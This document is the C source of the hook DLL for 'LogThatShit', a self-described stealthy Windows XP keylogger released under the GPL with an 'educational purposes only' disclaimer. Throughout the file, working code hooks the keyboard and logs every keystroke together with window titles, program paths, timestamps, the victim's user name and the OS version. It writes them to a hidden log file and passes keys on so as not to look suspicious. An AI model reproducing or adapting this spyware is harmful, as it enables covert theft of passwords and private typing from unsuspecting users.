
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.




#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <windows.h> 
#include "Hook.h" 
#include "Common.h" 


/* The following will only be read once from the associated memory mapped buffer. */ 
char logfile[MAX_PATH+1]; 
char filename[MAX_PATH+1]; 
char username[65]; 
char operatingsystem[65]; 
char GotFlags = 0; 
LTSFlags flags; 
HANDLE mutex_log; 
HANDLE mutex_status; 


/* -- READ: MingW doesn't support data_seg, this is the equivelant. ----- */ 
HWND hWnd __attribute__((section (LTS_DATA_SEG_NAME), shared)) = 0; 
char caption[256] __attribute__((section (LTS_DATA_SEG_NAME), shared)) = {0}; 
/* ---------------------------------------------------------------------- */ 


void Log(const char* const line) { 
	/* Log line to the log file. */ 
	FILE* fp; 

	WaitForSingleObject(mutex_log, MUTEX_WAIT_MS); 

	fp = fopen(logfile, "a"); 
	if (!fp) { 
		char X[1024]; 
		snprintf(X, 1024, "Unable to log line \"%s\" to file \"%s\" (%s)", line, logfile, strerror(errno)); 
		INFO(X); 
		ReleaseMutex(mutex_log); 
		return; 
	} 

	fputs(line, fp); 
/*	printf(line); */ 
	fclose(fp); 
	ReleaseMutex(mutex_log); 
} 


void GetOperatingSystem() { 
	OSVERSIONINFO info; 
	char version[33]; 

	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (!GetVersionEx(&info)) { 
		WIN_ERR("Unable to get OS."); 
		strncpy(operatingsystem, "Windows", 64); 
		return; 
	} 

	if (info.dwPlatformId==VER_PLATFORM_WIN32_NT) { 
		/* NT platform (NT/2K/XP/2003) */ 
		if (info.dwMajorVersion >= 5) 
			switch (info.dwMinorVersion) { 
				case 0: 
					strncpy(version, "2000/NT4", 32); 
					break; 
				case 1: 
					strncpy(version, "Windows XP", 32); 
					break; 
				case 2: 
					strncpy(version, "Windows Server 2003", 32); 
					break; 
			} 
		else 
			strncpy(version, "Windows NT", 32); 
	} else { 
		if (info.dwMajorVersion==4) 
			switch (info.dwMinorVersion) { 
			case 0: 
				strncpy(version, "Windows 95", 32); 
				break; 
			case 10: 
				strncpy(version, "Windows 98", 32); 
				break; 
			case 90: 
				strncpy(version, "Windows ME", 32); 
				break; 
			} 
		else 
			strncpy(version, "Windows 9X", 32); 
	} 

	/* Construct the OS line. */ 
	snprintf(operatingsystem, 64, "%s %lu.%lu.%lu", version, info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber); 
	operatingsystem[64] = '\0'; 
    return;
} 


void GetLogPath() { 
	/*	Get path to log file from memory. 
		This does not change, we only need to get it once. 
		Caller should of checked if she NEEDED it before calling me! */ 
	HANDLE mm; 
	char* p; 

	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_LOGFILE); 
	if (!mm) { 
		INFO("fucked opening log path! :("); 
		return; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, MAX_PATH); 
	if (!p) { 
		WIN_ERR("Unable to map a view of mapped file."); 
		return; 
	} 

	CopyMemory(logfile, p, MAX_PATH); 
	UnmapViewOfFile(p); 
} 


void CheckLogStatus() { 
	HANDLE mm; 
	char* p; 
	LogStatus reason; 
	SYSTEMTIME st; 
	FILE* fp; 
	char header[256]; 

	/* Get the reason from memory. */ 
	WaitForSingleObject(mutex_status, MUTEX_WAIT_MS); 
	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_STATUS); 
	if (!mm) {
		WIN_ERR("Unable to open file mapping to check log status in hook DLL."); 
		ReleaseMutex(mutex_status); 
		return; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(LogStatus)); 
	if (!p) {
		WIN_ERR("Unable to map a view of file holding log status in hook DLL."); 
		ReleaseMutex(mutex_status); 
		return; 
	} 

	CopyMemory(&reason, p, sizeof(LogStatus)); 
	UnmapViewOfFile(p); 

	/* If we are still on the same log, we have nothing to change. Just keep logging. */ 
	if (NO_CHANGE==reason) {
		ReleaseMutex(mutex_status); 
		return; 
	} 


	/* Write a header before starting to log keys again. */ 

	/* 	Get current victim's user name. Just like the log path, we only 
		need this once. Check to see if it exists first. */ 
	if (!username[0]) { 
		DWORD unsz = 64; 
		if (!GetUserName(username, &unsz)) { 
			WIN_ERR("Unable to get username. Setting a default username."); 

			/* 64 was probably too small? Just put some default shit then. */ 
			strncpy(username, "**Error**", 64); 
		} 
	} 

	/* Get the OS. */ 
	if (!operatingsystem[0]) GetOperatingSystem(); 

	/* Construct header. */ 
	GetLocalTime(&st); 
	snprintf(header, 256, 	"\n\n***Logging started @ %.2d:%.2d:%.2d on %.2d/%.2d/%d for user %s (%s)***\n", \
							st.wHour, st.wMinute, st.wSecond, st.wMonth, st.wDay, st.wYear, username, operatingsystem); 
	header[256] = '\0'; 

	/* If this is the initial log, don't clear it. */ 
	WaitForSingleObject(mutex_log, MUTEX_WAIT_MS); 

	if (INITIAL_LOG==reason) { 
		/* It might already exist and contain previous key strokes. */ 
		fp = fopen(logfile, "a"); 
		if (!fp) { 
			WIN_ERR("Error opening log file to append header to."); 
			ReleaseMutex(mutex_status); 
			ReleaseMutex(mutex_log); 
			return; 
		} 
	} else { 
		/* Max log size reached, clear the log. */ 
		remove(logfile); 
		fp = fopen(logfile, "a"); 
		if (!fp) { 
			WIN_ERR("Error clearing log file."); 
			ReleaseMutex(mutex_status); 
			ReleaseMutex(mutex_log); 
			return; 
		} 
	} 

	/* Make the log file hidden. */ 
	SetFileAttributes(logfile, FILE_ATTRIBUTE_HIDDEN); 

	/* Write the header to the file and close it. */ 
	fputs(header, fp); 
	fclose(fp); 

	/* Don't want to hold on to this longer than needed. */ 
	ReleaseMutex(mutex_log); 

	/* Set flag indicating we already processed it. We don't want to do that again. */ 
	reason = NO_CHANGE; 

	/* Write the change to mapped buf. We have the 'reason' mutex (mr) from above. */ 
	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_STATUS); 
	if (!mm) { 
		WIN_ERR("Unable to open file mapping to set log status to cleared."); 
		ReleaseMutex(mutex_status); 
		return; 
	} 

	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(LogStatus)); 
	if (!p) { 
		WIN_ERR("Unable to map view of file to set log status to cleared."); 
		ReleaseMutex(mutex_status); 
		return; 
	} 

	CopyMemory(p, &reason, sizeof(LogStatus)); 
	UnmapViewOfFile(p); 
	ReleaseMutex(mutex_status); 
} 


void GetFlags() { 
	/* Read flags from a memory mapped buffer. */ 
	HANDLE mm;
	char* p; 

	/* Open the flags file mapping, on failure, set default values and return. */ 
	mm = OpenFileMapping(FILE_MAP_ALL_ACCESS, 0, LTS_MMBUF_FLAGS); 
	if (!mm) { 
		WIN_ERR("Unable to open flags mapping."); 

		/* Set default values and caller will retry on next iteration. */ 
		flags = 15; /* Default = enable everything. */ 
		return; 
	} 

	/* Open a view to the flags mapping, on failure, set default values and return. */ 
	p = MapViewOfFile(mm, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(LTSFlags)); 
	if (!p) { 
		WIN_ERR("Unable to map a view of mapped file flags."); 
		/* Set default values and caller will retry on next iteration. */ 
		flags = 15; /* Default = enable everything. */ 
		return; 
	} 

	CopyMemory(&flags, p, sizeof(LTSFlags)); 
	UnmapViewOfFile(p); 

	/*	We have the flags. We do not need them again. 
		The caller should check this to see if she should call us or not. */ 
	GotFlags = 1; 
} 


LRESULT DLLIMPORT CALLBACK HookProc(int code, WPARAM wParam, LPARAM lParam) { 
	/* If this is a WM_KEYUP message, translate the key and log it. */ 
	if (code==HC_ACTION && !(HIWORD(lParam) & KF_UP)) { 
		char buf[256] = {0}; 
		HWND hWnd2;

		if (!mutex_status) mutex_status = OpenMutex(MUTEX_ALL_ACCESS, 0, MUTEX_NAME_STATUS); 
		if (!mutex_log) mutex_log = OpenMutex(MUTEX_ALL_ACCESS, 0, MUTEX_NAME_LOG); 

		/* Let's check to see if we already the logfile. It is initially initialized. */ 
		if (!logfile[0]) GetLogPath(); 

		/* Check to see if we should clear the current log. */ 
		CheckLogStatus(); 

		/* Get flags (if we do not have them already). They will tell us what to log. */ 
		if (!GotFlags) GetFlags(); 

		/* Check if focus and/or title changed. */ 
		hWnd2 = GetForegroundWindow(); 
		if (hWnd2) { 
			char LogStatus = 0; 
			char statusbuf[256] = {0}; 
			char title[256]; 

			/* Check what window this was sent to. Get title. */ 
			GetWindowText(hWnd2, title, 256); 

			if (hWnd != hWnd2) {
				/* Got a new hwnd. Meaning a new window got focus. Save the hWnd. */ 
				hWnd = hWnd2; 
				if (!LogStatus) LogStatus = 1; /* 1 == hWnd changed */ 
			} 

			if ((flags & LogTitleChange) && 0 != strncmp(caption, title, 256)) { 
				/* Title changed, it might still be the same window, but let's log status. */ 
				if (!LogStatus) LogStatus = 2; /* 2 == Caption changed */ 
				strncpy(caption, title, 256); 
			} 

			if (LogStatus) { 
				/* Leave 1 blank line between the last logged keys. */ 
				statusbuf[0] = statusbuf[1] = '\n'; 
				if ((flags & LogFocusTimeStamp)) { 
					SYSTEMTIME st; 
					GetLocalTime(&st); 
					snprintf(statusbuf+2, 254, "(%.2d:%.2d:%.2d) ", st.wHour, st.wMinute, st.wSecond); 
				}

				if ((flags & LogFocusTitle)) { 
					strncat(statusbuf, "(", 256); 
					strncat(statusbuf, title, 256); 
					if (LogStatus == 2) 
						strncat(statusbuf, ")* ", 256); 
					else
						strncat(statusbuf, ") ", 256); 
				} 

				/* Get path to what we are currently injected to. */ 
				if ((flags & LogFocusPath)) { 
					/* If we DO NOT have the path, get it. */ 
					if (!filename[0]) { 
						HANDLE h; 
						h = GetModuleHandle(0); 
						if (!h || !GetModuleFileName(h, filename, MAX_PATH)) { 
							WIN_ERR("Unable to get path of current program.."); 
							/* Will retry on next iteration.. */ 
						} 
					} 

					strncat(statusbuf, "(", 256); 
					strncat(statusbuf, filename, 256); 
					strncat(statusbuf, ") ", 256); 
				} 

				/* Write status line to file. */ 
				if (statusbuf[0]) { 
					strncat(statusbuf, "\n", 256); 
					Log(statusbuf); 
				} 
			} 
		} 

		/* Get the actual character pressed. */ 
		if (wParam == 0x20)	buf[0] = ' '; /* Is the key a space? */ 

		else if (wParam >= 0x41 && wParam <= 0x5A) {/* Is it between A-Z? */ 
			/* By default the chars are uppercase. */ 
			char CapsOn, ShiftDown; 

			ShiftDown = HIWORD(GetKeyState(VK_SHIFT)) & 1;	/* 1 if Shift is down. */ 
			CapsOn = GetKeyState(VK_CAPITAL) & 1; 			/* 1 if Capslock is on. */ 

			/* If shift is NOT being held down and capslock is OFF == Lowercase */ 
			if (!ShiftDown && !CapsOn) buf[0] = wParam+32; 

			/* If shift IS being held down but caps is ON == Lowercase */ 
			else if (ShiftDown && CapsOn) buf[0] = wParam+32; 

			/* In any other case (caps ON is the only other case?), char is capital. */ 
			else buf[0] = wParam; 

		} else if (wParam >= 0x30 && wParam <= 0x39) {	/* Is it between 0-9? */ 
			char alt[] = ")!@#$%^&*("; 
			if (HIWORD(GetKeyState(VK_SHIFT)) & 1)	/* Is shift being held down? */ 
				buf[0] = alt[wParam-0x30]; 
			else	/* Guess not, just output the # then. */ 
				buf[0] = wParam; 

		} else if (wParam >= 186 && wParam <= 192) {	/* Is the key ;=,-./	*/ 
			char alt[] = ":+<_>?"; 
			char norm[] = ";=,-./"; 
			if (HIWORD(GetKeyState(VK_SHIFT)) & 1) 
				buf[0] = alt[wParam-186]; 
			else 
				buf[0] = norm[wParam-186]; 

		} else if (wParam >= 219 && wParam <= 222) {	/* Is the key [\]' 	*/ 
			char alt[] = "{|}\""; 
			char norm[] = "[\\]'"; 
			if (HIWORD(GetKeyState(VK_SHIFT)) & 1) { 
				buf[0] = alt[wParam-219]; 
			} else 
				buf[0] = norm[wParam-219]; 

		} else if (wParam=='`') {	/* Maybe a tilde ~ */ 
			buf[0] = (HIWORD(GetKeyState(VK_SHIFT)) & 1) ? '~' : '`'; 

		} else {	/* The key is special (TAB, ENTER, etc) */ 
			int i; 
			buf[0] = '['; 
			i = GetKeyNameText(lParam, buf+1, 255); 
			buf[i+1] = ']'; 
		} 

		Log(buf); 
	} 

	/* We want other programs to get the key, we don't want to be suspicious. */ 
	return CallNextHookEx(0, code, lParam, wParam); 
} 


